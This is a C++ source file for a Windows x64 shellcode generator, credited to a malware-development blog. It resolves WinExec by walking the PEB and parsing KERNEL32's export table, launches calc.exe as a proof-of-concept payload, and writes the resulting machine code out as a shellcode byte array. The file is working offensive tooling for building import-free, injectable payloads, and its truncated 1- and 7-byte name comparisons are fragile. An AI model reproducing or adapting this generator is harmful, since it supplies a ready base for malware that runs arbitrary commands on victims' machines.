/*
Code inspiration from
https://steve-s.gitbook.io/0xtriboulet/just-malicious/from-c-with-inline-assembly-to-shellcode
*/

#include <cstdlib>
#include <fstream>
#include <sstream>
#include <iostream>
#include <string>

#include <windows.h>
#include <intrin.h>

#include "../../includes/structs.hpp"
#include "../../../commons/includes/compiler.h"
#include "../../includes/gen_commons.hpp"

INT main() {
  using std::ofstream, std::string, std::cerr;
  using std::stringstream, std::endl, std::cout;

  auto begin_addr = static_cast<unsigned char*>(get_address_after_call());

  const char sKernel32[] = {'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '\0'};

  const char sWinExec[] = {'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0'};

  const char sCalcExe[] = {
      'c', 'a', 'l', 'c', '.', 'e', 'x', 'e', '\0',
  };

  WinExec_t pWinExec =
      (WinExec_t)LocalGetProcAddress(LocalGetModuleHandle(sKernel32), sWinExec);
  pWinExec(sCalcExe, 0);

  auto end_addr = static_cast<unsigned char*>(get_address_after_call());

  constexpr int instructions_before_return = 5;
  end_addr -= instructions_before_return;

  cout << "Start address: " << static_cast<void*>(begin_addr) << endl;
  cout << "End address: " << static_cast<void*>(end_addr) << endl;

  stringstream str_stream;
  str_stream << "unsigned char shellcode[] = {";

  // save original rbp
  const char* push_rbp = "0x55, ";
  //  Align the stack
  const char* and_rsp_0xfffffffffffffff0 = "0x48, 0x83, 0xE4, 0xF0, ";
  // Allocate stack
  const char* sub_rsp_0x1000 = "0x48, 0x81, 0xEC, 0x00, 0x10, 0x00, 0x00, ";
  const char* mov_rbp_rsp = "0x48, 0x89, 0xE5, ";

  str_stream << push_rbp << and_rsp_0xfffffffffffffff0 << sub_rsp_0x1000 << mov_rbp_rsp;

  string opcodes_str = get_asm_opcodes_str(begin_addr, end_addr);
  str_stream << opcodes_str;

  // Cleanup stack
  const char* add_rsp_0x1000 = "0x48, 0x81, 0xC4, 0x00, 0x10, 0x00, 0x00, ";
  // restore original rbp
  const char* const pop_rbp = "0x5D, ";
  // return to caller after shellcode execution
  const char* const ret = "0xC3};";

  str_stream << add_rsp_0x1000;
  str_stream << pop_rbp << ret << endl;

  cout << str_stream.str();

  ofstream outfile("./shellcodes/generate_shellcode.h");
  if (!outfile) {
    cerr << "Failed to open the file for writing." << endl;
    exit(EXIT_FAILURE);
  }

  outfile << "// This file was generated by the shellcode_gen_msvc_cpp" << endl;
  outfile << "#pragma once" << endl << str_stream.str();
  outfile.close();

  return EXIT_SUCCESS;
}

extern "C" {
__forceinline HANDLE LocalGetModuleHandle(CONST CHAR* sModuleName) {
  PPEB pPeb = NULL;
  HANDLE pBase = NULL;

  //  PEB
  pPeb = (PPEB)__readgsqword(0x60);

  //  Getting the Ldr
  PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

  //  Getting the first element in the linked list which contains information
  //  about the first module
  PLDR_DATA_TABLE_ENTRY pDte =
      (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

  while (pDte) {
    //  If not null
    if (pDte->FullDllName.Length != (USHORT)0x0) {
      //  Check if both equal
      if (mem_cmp(pDte->FullDllName.Buffer, sModuleName, 0x1) == 0) {
        //  Found sModuleName
        pBase = (HMODULE)(pDte->InInitializationOrderLinks.Flink);

        return pBase;
      }

    } else {
      break;
    }

    //  Next element in the linked list
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
  }

  return NULL;
}

__forceinline PVOID LocalGetProcAddress(HANDLE vpBase, CONST CHAR* sFuncName) {
  auto pBase = static_cast<unsigned char*>(vpBase);

  //  Getting the dos header and doing a signature check
  PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

  //  Getting the nt headers and doing a signature check
  PIMAGE_NT_HEADERS pImgNtHdrs =
      (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

  //  Getting the optional header
  IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

  //  Getting the image export table
  PIMAGE_EXPORT_DIRECTORY pImgExportDir =
      (PIMAGE_EXPORT_DIRECTORY)(pBase +
                                ImgOptHdr
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);

  //  Getting the function's names array pointer
  PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

  //  Getting the function's addresses array pointer
  PDWORD FunctionAddressArray =
      (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

  //  Getting the function's ordinal array pointer
  PWORD FunctionOrdinalArray =
      (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

  //  Looping through all the exported functions
  for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
    //  Getting the name of the function
    CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

    //  Getting the address of the function through its ordinal
    PVOID pFunctionAddress =
        (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

    //  Searching for the function specified
    if (mem_cmp(sFuncName, pFunctionName, 0x7) == 0) {
      return pFunctionAddress;
    }
  }

  return NULL;
}

__forceinline INT mem_cmp(CONST VOID* str1, CONST VOID* str2, SIZE_T n) {
  CONST UCHAR* s1 = (CONST UCHAR*)str1;
  CONST UCHAR* s2 = (CONST UCHAR*)str2;

  while (n--) {
    if (*s1 != *s2) return *s1 - *s2;
    s1++;
    s2++;
  }
  return 0;
}
}